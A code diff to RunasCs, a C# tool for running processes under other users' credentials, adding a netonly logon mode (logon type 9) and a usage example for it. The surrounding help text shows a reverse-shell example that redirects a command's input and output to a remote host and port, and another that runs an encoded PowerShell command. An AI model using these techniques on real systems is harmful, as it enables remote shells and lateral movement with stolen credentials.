@@ -27,6 +27,8 @@ public class RunasCs
     private const uint CREATE_UNICODE_ENVIRONMENT = 0x00000400;
     private const uint SE_PRIVILEGE_ENABLED = 0x00000002;
     private const uint DUPLICATE_SAME_ACCESS = 0x00000002;
+    private const UInt32 LOGON_WITH_PROFILE = 1;
+    private const UInt32 LOGON_NETCREDENTIALS_ONLY = 2;
 
     private IntPtr socket;
     private IntPtr hErrorWrite;
@@ -512,7 +514,13 @@ public class RunasCs
 
         if(createProcessFunction == 2){
 
-            success = CreateProcessWithLogonW(username, domainName, password, (UInt32) 1, processPath, commandLine, CREATE_NO_WINDOW, (UInt32) 0, null, ref startupInfo, out processInfo);
+            if(logonType == 9){
+                if(domainName == "")
+                    throw new RunasCsException("You must provide a domain name when using logon type 9 with CreateProcessWithLogonW.");
+                success = CreateProcessWithLogonW(username, domainName, password, LOGON_NETCREDENTIALS_ONLY, processPath, commandLine, CREATE_NO_WINDOW, (UInt32) 0, null, ref startupInfo, out processInfo);
+            }
+            else
+                success = CreateProcessWithLogonW(username, domainName, password, LOGON_WITH_PROFILE, processPath, commandLine, CREATE_NO_WINDOW, (UInt32) 0, null, ref startupInfo, out processInfo);
             if (success == false){
                 throw new RunasCsException("CreateProcessWithLogonW failed with " + Marshal.GetLastWin32Error());
             }
@@ -1312,6 +1320,8 @@ Examples:
         RunasCs.exe user1 password1 ""%COMSPEC% powershell -enc..."" -t 0
     Redirect stdin, stdout and stderr of the specified command to a remote host
         RunasCs.exe user1 password1 cmd.exe -r 10.10.10.24:4444
+    Run a command simulating the /netonly flag of runas.exe 
+        RunasCs.exe user1 password1 whoami -d domain -l 9
 ";
     
     // .NETv2 does not allow dict initialization with values. Therefore, we need a function :(
